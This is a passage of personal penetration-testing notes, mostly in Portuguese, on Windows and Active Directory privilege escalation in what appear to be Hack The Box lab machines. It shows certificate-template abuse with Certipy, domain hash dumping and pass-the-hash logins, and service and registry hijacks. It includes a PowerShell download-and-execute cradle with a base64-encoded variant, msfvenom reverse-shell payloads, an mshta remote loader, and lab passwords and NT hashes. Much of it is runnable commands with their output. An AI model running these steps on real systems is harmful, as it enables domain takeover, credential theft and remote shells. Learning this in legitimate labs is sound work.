        Certificate Validity Start          : 2022-11-18 20:58:46+00:00
        Certificate Validity End            : 2121-11-18 21:08:46+00:00
        Web Enrollment                      : Disabled
        User Specified SAN                  : Disabled
        Request Disposition                 : Issue
        Enforce Encryption for Requests     : Enabled
        Permissions
          Owner                             : SEQUEL.HTB\Administrators
          Access Rights
            ManageCertificates              : SEQUEL.HTB\Administrators
                                              SEQUEL.HTB\Domain Admins
                                              SEQUEL.HTB\Enterprise Admins
            ManageCa                        : SEQUEL.HTB\Administrators
                                              SEQUEL.HTB\Domain Admins
                                              SEQUEL.HTB\Enterprise Admins
            Enroll                          : SEQUEL.HTB\Authenticated Users
    Certificate Templates
      0
        Template Name                       : UserAuthentication
        Display Name                        : UserAuthentication
        Certificate Authorities             : sequel-DC-CA
        Enabled                             : True
        Client Authentication               : True
        Enrollment Agent                    : False
        Any Purpose                         : False
        Enrollee Supplies Subject           : True
        Certificate Name Flag               : EnrolleeSuppliesSubject
        Enrollment Flag                     : PublishToDs
                                              IncludeSymmetricAlgorithms
        Private Key Flag                    : 16777216
                                              65536
                                              ExportableKey
        Extended Key Usage                  : Client Authentication
                                              Secure Email
                                              Encrypting File System
        Requires Manager Approval           : False
        Requires Key Archival               : False
        Authorized Signatures Required      : 0
        Validity Period                     : 10 years
        Renewal Period                      : 6 weeks
        Minimum RSA Key Length              : 2048
        Permissions
          Enrollment Permissions
            Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                              SEQUEL.HTB\Domain Users
                                              SEQUEL.HTB\Enterprise Admins
          Object Control Permissions
            Owner                           : SEQUEL.HTB\Administrator
            Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                              SEQUEL.HTB\Enterprise Admins
                                              SEQUEL.HTB\Administrator
            Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                              SEQUEL.HTB\Enterprise Admins
                                              SEQUEL.HTB\Administrator
            Write Property Principals       : SEQUEL.HTB\Domain Admins
                                              SEQUEL.HTB\Enterprise Admins
                                              SEQUEL.HTB\Administrator
        [!] Vulnerabilities
          ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
    ```
    
    `certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication`
    
    ```
    └──╼ [★]$ certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -debug
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [+] Trying to resolve 'sequel.htb' at '1.1.1.1'
    [+] Trying to resolve '' at '1.1.1.1'
    [+] Generating RSA key
    [*] Requesting certificate via RPC
    [+] Trying to connect to endpoint: ncacn_np:10.129.228.253[\pipe\cert]
    [+] Connected to endpoint: ncacn_np:10.129.228.253[\pipe\cert]
    [*] Successfully requested certificate
    [*] Request ID is 13
    [*] Got certificate with UPN 'administrator@sequel.htb'
    [*] Certificate has no object SID
    [*] Saved certificate and private key to 'administrator.pfx'
    ```
    
    `certipy auth -pfx administrator.pfx`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%209.png)
    
- Certipy 2
    
    `certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip
    10.10.11.222 -vulnerable`
    
    ```
    certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip
    10.10.11.222 -vulnerable
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    [*] Finding certificate templates
    [*] Found 37 certificate templates
    [*] Finding certificate authorities
    [*] Found 1 certificate authority
    [*] Found 13 enabled certificate templates
    [*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
    A section of the outputted txt file gives us some information about certificate templates and
    more specifically about a template called CorpVPN .
    [!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA:
    CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
    [*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
    [!] Failed to connect to remote registry. Service should be starting now. Trying
    again...
    [*] Got CA configuration for 'AUTHORITY-CA'
    [*] Saved BloodHound data to '20231013125232_Certipy.zip'. Drag and drop the file
    into the BloodHound GUI from @ly4k
    [*] Saved text output to '20231013125232_Certipy.txt'
    [*] Saved JSON output to '20231013125232_Certipy.json'
    ```
    
    Abrir o certificado
    
    ```
    cat 20230423202134_Certipy.txt
    <snip>
    Certificate Templates
    0
    Template Name : CorpVPN
    Display Name : Corp VPN
    Certificate Authorities : AUTHORITY-CA
    Enabled : True
    Client Authentication : True
    Enrollment Agent : False
    Any Purpose : False
    Enrollee Supplies Subject : True
    Certificate Name Flag : EnrolleeSuppliesSubject
    Enrollment Flag : AutoEnrollmentCheckUserDsCertificate
    PublishToDs
    IncludeSymmetricAlgorithms
    Private Key Flag : 16777216
    65536
    ExportableKey
    Extended Key Usage : Encrypting File System
    Secure Email
    Client Authentication
    Document Signing
    IP security IKE intermediate
    IP security use
    KDC Authentication
    Requires Manager Approval : False
    Requires Key Archival : False
    Authorized Signatures Required : 0
    Validity Period : 20 years
    Renewal Period : 6 weeks
    Minimum RSA Key Length : 2048
    Permissions
    Enrollment Permissions
    Enrollment Rights : AUTHORITY.HTB\Domain Computers
    AUTHORITY.HTB\Domain Admins
    AUTHORITY.HTB\Enterprise Admins
    Object Control Permissions
    Owner : AUTHORITY.HTB\Administrator
    Write Owner Principals : AUTHORITY.HTB\Domain Admins 
    AUTHORITY.HTB\Enterprise Admins
    AUTHORITY.HTB\Administrator
    Write Dacl Principals : AUTHORITY.HTB\Domain Admins
    AUTHORITY.HTB\Enterprise Admins
    AUTHORITY.HTB\Administrator
    Write Property Principals : AUTHORITY.HTB\Domain Admins
    AUTHORITY.HTB\Enterprise Admins
    AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
    ESC1 : 'AUTHORITY.HTB\\Domain Computers' can
    enroll, enrollee supplies subject and template allows client authentication
    ```
    
    Acrescentar os dominios dos hosts `echo 10.10.11.222 authority.authority.htb authority.htb | sudo tee -a /etc/hosts`
    
    No certificado vemos que temos uma forma de escalar privilégios ESC1
    
    Isto indica nos que a partir dos certificados podemos delegar o utilizador que temos ao grupo de utilizadores administradores. Para isso temos de criar um utilizador novo.
    
    [`addcomputer.py](http://addcomputer.py/) 'authority.htb/svc_ldap' -method LDAPS -computer-name 'EVIL01' -
    computer-pass 'Str0ng3st_P@ssw0rd!' -dc-ip 10.10.11.222`
    
    ```
    addcomputer.py 'authority.htb/svc_ldap' -method LDAPS -computer-name 'EVIL01' -
    computer-pass 'Str0ng3st_P@ssw0rd!' -dc-ip 10.10.11.222
    
    Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
    Password:lDaP_1n_th3_cle4r!
    [*] Successfully added machine account EVIL01$ with password Str0ng3st_P@ssw0rd!.
    ```
    
    Obter o certificado de adminsitradores 
    
    `certipy req -username EVIL01$ -password 'Str0ng3st_P@ssw0rd!' -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb -debug`
    
    ```
    certipy req -username EVIL01$ -password 'Str0ng3st_P@ssw0rd!' -ca AUTHORITY-CA -
    dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns
    authority.htb -debug
    
    Note: If you get a clock skew error, sync your host with the Domain Controller host
    using ntpdate .
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    [+] Generating RSA key
    [*] Requesting certificate via RPC
    [+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
    [+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
    [*] Successfully requested certificate
    [*] Request ID is 4
    [*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
    [*] Certificate has no object SID
    [*] Saved certificate and private key to 'administrator_authority.pfx'
    ```
    
    Utilizando o certificado que temos não e possivel obter um TGT 
    
    `certipy auth -pfx administrator_authority.pfx -debug`
    
    ```
    certipy auth -pfx administrator_authority.pfx -debug
    
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    [*] Found multiple identifications in certificate
    [*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
    > 0
    [+] Trying to resolve 'authority.htb' at '8.8.8.8'
    [*] Using principal: administrator@authority.htb
    [*] Trying to get TGT...
    [-] Got error while trying to request TGT: Kerberos SessionError:
    KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
    ```
    
    Por isso, instalamos o passthecert
    
    ```
    git clone https://github.com/AlmondOffSec/PassTheCert.git
    cd PassTheCert
    cp ../administrator_authority.pfx .
    ```
    
    Utilizamos o ssl e colocar duas vezes a password no PEM, password 1234
    
    `openssl pkcs12 -in administrator_authority.pfx -nocerts -out administrator.key`
    
    ```
    openssl pkcs12 -in administrator_authority.pfx -nocerts -out administrator.key
    Enter Import Password:
    Enter PEM pass phrase:1234
    Verifying - Enter PEM pass phrase
    ```
    
    ```
    openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out
    administrator.crt
    Enter Import Password:
    ```
    
    A partir daqui existem duas alternativas
    
    - Adicionar ao grupo de administradores
        
        Password `1234`
        
        ```
        python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb  -dc-ip 10.129.229.56 
        Impacket v0.12.0.dev1+20231130.165011.d370e635 - Copyright 2023 Fortra
        
        Enter PEM pass phrase:
        Type help for list of commands
        
        # add_user_to_group svc_ldap administrators
        Adding user: svc_ldap to group Administrators result: OK
        
        # exit
        Bye!
        ```
        
        `psexec.py svc_ldap@10.129.229.56`
        
    - Obter Hash
        
        `python3 ./Python/passthecert.py -dc-ip 10.10.11.222 -crt administrator.crt -key
        administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to
        'AUTHORITY$' -delegate-from 'EVIL01$'`
        
        ```
        python3 ./Python/passthecert.py -dc-ip 10.10.11.222 -crt administrator.crt -key
        administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to
        'AUTHORITY$' -delegate-from 'EVIL01$'
        Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
        Enter PEM pass phrase:1234
        [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
        [*] Delegation rights modified successfully!
        [*] EVIL01$ can now impersonate users on AUTHORITY$ via S4U2Proxy
        [*] Accounts allowed to act on behalf of other identity:
        [*] EVIL01$ (S-1-5-21-622327497-3269355298-2248959698-11602)
        ```
        
        Impersonar o TGT
        
        `impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator
        'authority.htb/EVIL01$:Str0ng3st_P@ssw0rd!'`
        
        ```
        impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator
        'authority.htb/EVIL01$:Str0ng3st_P@ssw0rd!'
        Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
        [-] CCache file is not found. Skipping...
        [*] Getting TGT for user
        [*] Impersonating Administrator
        [*] Requesting S4U2self
        [*] Requesting S4U2Proxy
        [*] Saving ticket in Administrator.ccache
        Now we can dump all the hashes.
        Finally, we can use the NT hash to pass-the-hash to the Domain Controller host and win-rm as 
        administrator :
        The root flag can be found at C:\Users\Administrator\Desktop\root.txt .
        export KRB5CCNAME=Administrator.ccache
        ```
        
        Fazer o dump das Hashs
        
        `impacket-secretsdump -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm`
        
        ```
        impacket-secretsdump -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm
        Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
        [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
        [*] Using the DRSUAPI method to get NTDS.DIT secrets
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4
        ed:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
        svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1::
        :
        AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:815fe0602456b443c45ac1b507d4684d
        :::
        [*] Cleaning up...
        ```
        
        Hash de administrador
        
        `Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::`
        
        Login 
        
        `evil-winrm -i 10.10.11.222 -u administrator -H 6961f422924da90a6928197429eea4ed`
        
    
- Certipy 3
    
    Vamos tentar identificar possíveis configurações incorretas dentro da Autoridade de Certificação. Vamos usar o certipy para encontrar quaisquer vulnerabilidades que possam existir.
    
    `certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable`
    
    ```bash
    certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout
    -vulnerable
    Certipy v4.7.0 - by Oliver Lyak (ly4k)
    [*] Finding certificate templates
    [*] Found 33 certificate templates
    [*] Finding certificate authorities
    [*] Found 1 certificate authority
    [*] Found 11 enabled certificate templates
    [*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
    [*] Got CA configuration for 'manager-DC01-CA'
    [*] Enumeration output:
    Certificate Authorities
    0
    CA Name : manager-DC01-CA
    DNS Name : dc01.manager.htb
    Certificate Subject : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start : 2023-07-27 10:21:05+00:00
    Certificate Validity End : 2122-07-27 10:31:04+00:00
    Web Enrollment : Disabled
    User Specified SAN : Disabled
    Request Disposition : Issue
    Enforce Encryption for Requests : Enabled
    Permissions
    Owner : MANAGER.HTB\Administrators
    Access Rights
    Enroll : MANAGER.HTB\Operator
    MANAGER.HTB\Authenticated Users
    MANAGER.HTB\Raven
    ManageCa : MANAGER.HTB\Administrators
    MANAGER.HTB\Domain Admins
    MANAGER.HTB\Enterprise Admins
    MANAGER.HTB\Raven
    ManageCertificates : MANAGER.HTB\Administrators
    MANAGER.HTB\Domain Admins
    MANAGER.HTB\Enterprise Admins
    [!] Vulnerabilities
    ESC7 : 'MANAGER.HTB\\Raven' has dangerous
    permissions
    Certificate Templates : [!] Could not find any certificate
    templates
    ```
    
    O relatório indica que o usuário Raven possui permissões perigosas, especialmente tendo direitos de "ManageCA" sobre a Autoridade de Certificação. Isso implica que, utilizando o cenário ESC7, poderíamos potencialmente elevar nossos privilégios para Administrador de Domínio enquanto operamos como usuário Raven. Uma explicação detalhada sobre o processo de exploração para o cenário ESC7 pode ser encontrada aqui. Para explorar isso, primeiro precisaremos adicionar Raven como "oficial", para que possamos gerenciar certificados e emiti-los manualmente.
    
    `certipy a -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven -debug`
    
    ```bash
    certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
    10.10.11.236 -ca manager-dc01-ca -add-officer raven -debug
    Certipy v4.7.0 - by Oliver Lyak (ly4k)
    [+] Authenticating to LDAP server
    [+] Bound to ldaps://10.10.11.236:636 - ssl
    [+] Default path: DC=manager,DC=htb
    [+] Configuration path: CN=Configuration,DC=manager,DC=htb
    [+] Trying to get DCOM connection for: 10.10.11.236
    [*] Successfully added officer 'Raven' on 'manager-dc01-ca'
    
    ```
    
    Agora que somos um oficial, podemos emitir e gerenciar certificados. O modelo SubCA pode ser ativado na CA com a flag -enable-template.
    
    `certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca`
    
    ```bash
    certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
    10.10.11.236 -ca manager-dc01-ca -enable-template subca
    Certipy v4.7.0 - by Oliver Lyak (ly4k)
    [*] Successfully enabled 'SubCA' on 'manager-dc01-ca'
    ```
    
    Os modelos de certificados habilitados podem ser listados usando a flag -list-templates.
    
    `certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -list-templates`
    
    ```bash
    certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
    10.10.11.236 -ca manager-dc01-ca -list-templates
    Certipy v4.7.0 - by Oliver Lyak (ly4k)
    [*] Enabled certificate templates on 'manager-dc01-ca':
    SubCA
    DirectoryEmailReplication
    DomainControllerAuthentication
    KerberosAuthentication
    EFSRecovery
    EFS
    DomainController
    WebServer
    Machine
    User
    Administrator
    ```
    
    As condições prévias para o ataque estão agora cumpridas. Temos permissão para Gerenciar Certificados, concedida por meio de GerenciarCA, e garantimos que o modelo SubCA esteja habilitado. Agora, vamos solicitar um certificado com base no modelo SubCA. Esta solicitação será negada, mas obteremos um ID de solicitação e uma chave privada, que vamos salvar em um arquivo.
    
    `certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb`
    
    ```bash
    certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
    10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
    Certipy v4.7.0 - by Oliver Lyak (ly4k)
    [*] Requesting certificate via RPC
    [-] Got error while trying to request certificate: code: 0x80094012 -
    CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not
    allow the current user to enroll for this type of certificate.
    [*] Request ID is 13
    Would you like to save the private key? (y/N) y
    [*] Saved private key to 13.key
    [-] Failed to request certificate
    ```
    
    Notamos que o ID do pedido de certificado é 13. Agora vamos usar as permissões obtidas para emitir manualmente o certificado falhado com o comando ca e o parâmetro -issue-request <ID do pedido>.
    
    `certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 13`
    
    ```bash
    certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
    10.10.11.236 -ca manager-dc01-ca -issue-request 13
    Certipy v4.7.0 - by Oliver Lyak (ly4k)
    [*] Successfully issued certificate
    ```
    
    > Se nesta fase receber um erro de [-] Got access denied trying to issue certificate, reexecute o comando onde adicionamos Raven como gerente. Os scripts de limpeza da caixa provavelmente restauraram as permissões iniciais.
    > 
    
    `certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 13`
    
    ```bash
    certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
    10.10.11.236 -ca manager-dc01-ca -retrieve 13
    Certipy v4.7.0 - by Oliver Lyak (ly4k)
    [*] Rerieving certificate with ID 13
    [*] Successfully retrieved certificate
    [*] Got certificate with UPN 'administrator@manager.htb'
    [*] Certificate has no object SID
    [*] Loaded private key from '13.key'
    [*] Saved certificate and private key to 'administrator.pfx'
    ```
    
    Com o arquivo PFX do administrador em nossa posse, agora podemos utilizá-lo para autenticação. Ao executar o comando auth, encontramos o erro "KRB_AP_ERR_SKEW (Desvio de relógio muito grande)".
    
    `certipy auth -pfx administrator.pfx`
    
    ```bash
    certipy auth -pfx administrator.pfx
    Certipy v4.7.0 - by Oliver Lyak (ly4k)
    [*] Using principal: administrator@manager.htb
    [*] Trying to get TGT...
    [-] Got error while trying to request TGT: Kerberos SessionError:
    KRB_AP_ERR_SKEW(Clock skew too great)
    ```
    
    O erro "KRB_AP_ERR_SKEW" ocorre quando há uma diferença significativa de tempo entre o cliente e os servidores KDC, afetando o processo de autenticação do Kerberos. Resolver esse problema envolve a sincronização do relógio da nossa máquina com o do servidor.
    
    Para fazer isso, precisamos desativar a configuração "Data e hora automáticas" nas configurações da nossa máquina e executar o seguinte comando para sincronizar nosso relógio:
    
    `sudo ntpdate -s manager.htb`
    
    `certipy auth -pfx administrator.pfx`
    
    ```bash
    certipy auth -pfx administrator.pfx
    Certipy v4.7.0 - by Oliver Lyak (ly4k)
    [*] Using principal: administrator@manager.htb
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saved credential cache to 'administrator.ccache'
    [*] Trying to retrieve NT hash for 'administrator'
    [*] Got hash for 'administrator@manager.htb':
    aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
    ```
    
    `evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef`
    
    ```bash
    evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
    Evil-WinRM shell v3.5
    Warning: Remote path completions is disabled due to ruby limitation:
    quoting_detection_proc() function is unimplemented on this machine
    Data: For more information, check Evil-WinRM GitHub:
    https://github.com/Hackplayers/evil-winrm#Remote-path-completion
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
    manager\administrator
    ```
    

# RUNAS

- RUNAS
    
    ```bash
    runas /user:ACCESS\Administrator /savecred IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.120:8000/Invoke-PowerShellTcp.ps1')
    
    converter para base64 de windows na maquina local
    echo -n "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.120:8000/Invoke-PowerShellTcp.ps1')" | iconv --to-code UTF-16LE | base64
    
    runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAyADAAOgA4ADAAMAAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA=="
    ```
    

# Windows Privilege Escalation

- Windows Privilege Escalation
    
    ```bash
    
    https://github.com/itm4n/PrivescCheck
    
    Metasploit for search vulnerabilities 
    run 
    
    FTP vulnerable aspx 
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.53 LPORT=4545 -f aspx > devel.aspx
    put devel.aspx
    
    powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
    runas.exe /user:administrator cmd
    hello_123321
    whoami
    
    Metasploit
    msfconsole -q
    use exploit/windows/misc/hta_server
    exploit
    
    mshta.exe http://10.10.15.2:8080/jxEyD3w.hta
    sessions -i 1
    cd C:\\Users\\Administrator\\Desktop
    dir
    cat flag.txt
    
    psexec.py Administrator@10.4.21.189 
    Password
    
    ```
    

# Env

- Variaveis de ambiente com evil-winrm
    
    ```bash
    type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    ```
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2010.png)
    
    ```bash
    Nova sessão 
    evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
    ```
    

# AdmPwd

- AdmPwd
    
    ```bash
    upload AdmPwd.PS
    Find-AdmPwdExtendedRights -identity *
    ```
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2011.png)
    
    ```bash
    Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders
    ```
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2012.png)
    
    ```bash
    get-admpwdpassword -computername dc01 | Select password
    ```
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2013.png)
    

# Kernal Exploit

- Kernel exploit
    - Automated
        
        ```powershell
        use post/multi/recon/local_exploit_suggester
        ```
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2014.png)
        
        ```powershell
        use /exploit/windows/local/bypassuac_eventvwr
        ps
        migrate <PID>
        ```
        
    - Manual

# Services Exploit

- Services Exploits
    - Insecure Service Permissions
        
        Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
        
        `C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
        
        Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).
        
        Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
        
        `sc qc daclsvc`
        
        Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
        
        `sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`
        
        Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
        
        `net start daclsvc`
        
    - Unquoted Service Path
        
        **Automated**
        
        `use exploit/windows/local/unquoted_service_path`
        
        **Manual**
        
        Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.
        
        `sc qc unquotedsvc`
        
        Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
        
        `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
        
        Copy the reverse.exe executable you created to this directory and rename it Common.exe:
        
        `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
        
        Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
        
        `net start unquotedsvc`
        
    - Weak Registry Permissions
        
        `.\winPEASx64.exe servicesinfo`
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2015.png)
        
        Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).
        
        `sc qc regsvc`
        
        Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
        
        `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
        
        Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
        
        `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
        
        Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
        
        `net start regsvc`
        
    - Insecure Service Executables
        
        Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).
        
        `sc qc filepermsvc`
        
        Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:
        
        `C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`
        
        Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
        
        `copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
        
        Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
        
        `net start filepermsvc`
        

# Registry

- Registry
    
    [AccessChk - Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
    
    - AutoRuns
        
        Query the registry for AutoRun executables:
        
        `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
        
        Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
        
        `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\"`
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2016.png)
        
        Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:
        
        `mv program.exe program_backup.exe`
        
        `upload /home/kali/Desktop/program.exe`
        
        `copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`
        
        Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!
        
        `rdesktop MACHINE_IP`
        
    - AlwaysInstallElevated
        
        **Manual**
        
        Query the registry for AlwaysInstallElevated keys:
        
        `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
        
        `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
        
        Note if both keys are set to 1 (0x1).
        
        On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
        
        `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`
        
        Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).
        
        Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:
        
        `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`
        
        **Automated**
        
        `use exploit/windows/local/always_install_elevated`
        
        `set SESSION <SESSION-ID>`
        
        `run`
        
    - Passwords
        
        The registry can be searched for keys and values that contain the word "password":
        
        `reg query HKLM /f password /t REG_SZ /s`
        
        If you want to save some time, query this specific key to find admin AutoLogon credentials:
        
        `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
        
        On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
        
        `winexe -U 'admin%password' //MACHINE_IP cmd.exe`
        
    - Saved Creds
        
        List any saved credentials:
        
